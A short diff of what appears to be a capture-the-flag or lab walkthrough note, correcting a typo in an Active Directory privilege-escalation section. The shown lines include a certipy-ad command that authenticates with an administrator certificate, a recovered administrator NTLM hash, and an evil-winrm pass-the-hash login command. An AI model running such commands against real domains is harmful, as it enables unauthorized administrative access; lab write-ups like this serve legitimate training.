@@ -11,7 +11,7 @@ certipy-ad auth -pfx administrator.pfx -dc-ip <IP_Machine>
 Administrator's hash: '*a773cb05d79273299a684a23ede56748*'
 
 #Attaking_machine 
-Coonect via WinRM
+Connect via WinRM
 
 ```BASH
 evil-winrm -i 10.129.244.72 -u 'administrator' -H 'a773cb05d79273299a684a23ede56748'
